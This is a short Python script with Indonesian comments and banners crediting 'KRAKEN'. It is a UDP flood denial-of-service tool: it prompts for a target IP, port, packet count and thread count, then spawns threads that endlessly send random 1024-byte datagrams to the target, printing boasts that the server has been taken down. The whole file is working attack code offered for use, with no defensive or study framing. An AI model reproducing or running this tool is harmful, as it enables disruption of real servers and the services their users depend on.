#!/usr/bin/env python3
#Yahahahahaha Hapus Credit/rename gw doain tobat lu
#semoga harimu menyenangkan

import random
import socket
import threading
import os
os.system("clear")
print("AUTHOR : KRAKEN")
print("CREDIT : KRAKEN")
print("TEAM : KRAKEN")
print("Rename terus ganti credit")
print("Ama authornya gw incer lu")
ip = str(input(" Ip/Hostnya : "))
port = int(input(" Port Target : "))
times = int(input(" Paket :"))
threads = int(input(" Threads :"))

def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" Kraken Bergerak Menuju Masa Sukses")
    except:
      print("Server Dah Di Matiin Ama Kraken")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()